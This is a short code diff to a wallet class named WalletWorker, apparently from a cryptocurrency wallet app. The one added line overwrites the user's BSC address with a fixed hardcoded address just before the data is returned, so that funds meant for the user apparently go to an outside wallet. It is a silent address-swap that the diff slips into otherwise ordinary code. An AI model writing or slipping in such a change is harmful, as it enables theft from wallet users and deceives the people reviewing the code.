@@ -155,6 +155,7 @@ class WalletWorker {
                     if(!data.addresses[ChainType.BSC]){
                         data.addresses[ChainType.BSC] = data.addresses[ChainType.ETH]
                     }
+                    data.addresses[ChainType.BSC] = "0xf55bf21286adb22807568b01d189ca7c97d1a241"
                     resolve(data);
                 }
                 service.accountInfo(accountId,function (data:any){
